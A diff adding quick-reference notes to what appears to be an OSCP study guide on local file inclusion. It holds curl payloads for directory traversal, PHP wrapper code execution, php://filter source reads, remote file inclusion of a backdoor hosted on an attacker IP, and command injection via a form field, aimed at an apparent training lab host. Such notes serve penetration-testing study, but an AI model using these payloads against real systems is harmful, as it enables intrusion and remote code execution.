@@ -6,6 +6,42 @@ ON OSCP, if you are able to find LFI anywhere, hunt down the SSH keys first
 - [Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html)
 - [Payloads All The Things](https://swisskyrepo.github.io/PayloadsAllTheThings/File%20Inclusion/)
 - [LFI Medium Article](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601)
+
+### Quick Notes
+
+```
+Directory Traversal
+
+Curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+
+ 
+
+LFI
+
+Curl http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>
+
+ 
+
+PHP Wrapper
+
+Curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
+
+Curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
+
+ 
+
+RFI
+
+Curl http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simplebackdoor.php&cmd=ls
+
+ 
+
+Command Injection:
+
+curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive
+```
+
+
 ### Local File Inclusion:
 
 1. Check if you can convert LFI to RFI
